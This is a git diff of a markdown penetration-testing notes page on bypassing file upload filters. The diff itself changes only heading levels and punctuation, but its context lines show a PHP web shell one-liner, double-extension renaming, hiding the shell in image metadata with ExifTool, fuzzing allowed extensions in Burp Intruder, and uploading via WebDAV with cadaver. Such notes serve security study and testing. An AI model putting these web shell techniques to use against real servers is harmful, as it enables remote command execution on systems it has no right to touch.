@@ -18,7 +18,7 @@ hide_title: true
 excerpt: ""
 ---
 
-# Bypass file upload filtering
+## Bypass file upload filtering
 
 - Rename it
 	- upload it as shell.php.jpg
@@ -42,7 +42,7 @@ system($_GET['cmd']);//or you can insert your complete shell code
 ?>
 ```
 
-## ExifTool
+### ExifTool
 
 ```
 1. <?php system($_GET['cmd']); ?>  //shell.php
@@ -52,7 +52,7 @@ system($_GET['cmd']);//or you can insert your complete shell code
 3. strings malicious.png | grep system
 ```
 
-# Bruteforcing extensions
+## Bruteforcing extensions
 
 - We can fuzz the extensions to find out which extensions are not blocked,
 - we will use burpsuite for this
@@ -66,12 +66,11 @@ Some useful extensions -
 - **Perl**: _.pl, .cgi_
 - **Erlang Yaws Web Server**: _.yaws_
 
-Now make list of extensions and add it to **intruder** to FUZZ and check out which one is worked
-![[image.avif]]
+Now make list of extensions and add it to **intruder** to FUZZ and check out which one is worked.
 
-Note: Make sure **url-encodin**g is unchecked in payload section, as it will unless encode our dot and we will not get desire results ,
+Note: Make sure **url-encodin**g is unchecked in payload section, as it will unless encode our dot and we will not get desire results.
 
-# WebDAV
+## WebDAV
 
 We can use `cadaver` to upload the shell
 
